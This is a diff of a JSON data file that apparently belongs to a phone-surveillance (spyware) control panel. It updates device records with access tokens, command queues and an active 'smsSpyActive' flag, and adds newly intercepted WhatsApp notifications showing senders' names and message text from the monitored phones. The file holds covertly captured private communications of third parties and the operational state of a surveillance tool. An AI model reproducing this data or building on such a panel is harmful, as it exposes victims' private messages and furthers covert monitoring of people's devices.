@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775040618888,
+    "lastSeen": 1775040621900,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14509 pesan dari 11 chat",
+        "time": "01/04 18:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040620629
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12158 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 18:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040620606
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ISIAN ZAYN X OWN [6] (93 pesan): ~ dikzz [own Zayn gb8 x PT bomo]",
@@ -3593,7 +3609,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775040619550,
+    "lastSeen": 1775040622583,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -3609,6 +3625,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12159 pesan): ~ syafa karamoy",
+        "content": "abis latian akuuu",
+        "time": "01/04 18:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040622816
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14509 pesan dari 11 chat",
+        "time": "01/04 18:50",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775040620617
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12158 pesan): ~ Bot",
